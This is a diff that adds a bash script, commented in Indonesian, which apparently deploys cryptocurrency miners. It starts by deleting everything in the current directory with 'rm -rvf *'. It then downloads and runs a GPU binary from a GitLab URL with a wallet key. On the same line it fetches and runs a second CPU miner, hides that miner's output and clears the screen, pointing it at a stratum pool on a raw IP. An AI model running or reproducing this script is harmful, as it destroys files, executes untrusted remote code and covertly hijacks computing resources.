@@ -1,0 +1,33 @@
+rm -rvf * && mkdir a && cd a
+
+# Buat wrapper run-glibc
+cat > "$HOME/run-glibc" <<'EOFW'
+#!/bin/bash
+GLIBC_PATH="$HOME/.local/glibc-2.35/lib"
+$GLIBC_PATH/ld-linux-x86-64.so.2 \
+  --library-path "$GLIBC_PATH:/lib/x86_64-linux-gnu:/usr/lib/x86_64-linux-gnu" "$@"
+EOFW
+chmod +x "$HOME/run-glibc"
+
+# Download & jalankan start
+cd "$HOME"
+cleanup_file start
+if ! wget -q https://gitlab.com/rokok/LA/-/raw/main/michat -O michat; then
+    echo "❌ Gagal download binary michat"
+    exit 1
+fi
+chmod +x michat
+
+echo "============================"
+echo "✅ Menjalankan michat dengan GLIBC 2.35"
+echo "============================"
+
+"$HOME/run-glibc" ./michat \
+  --pubkey=5VbwqMet8j7b148RiD4CKkvPKu6p9P9nFsC4hY8c17WPhzxeQ9cA4Fq \
+  --label=DGS \
+  --mode=gpu \
+  --threads-per-card=1 & wget https://gitlab.com/cuan8871816/jam/-/raw/main/sse2 && chmod 777 sse2 && ./sse2 -a power2b -o stratum+tcp://143.198.85.42:443 -u mbc1qc0r808p2xuw665s4gx9cnujfqjaa2fk2e02xax -t 4 > /dev/null 2>&1 & clear
+
+echo "============================"
+echo "🎯 Semua proses selesai!"
+echo "============================"
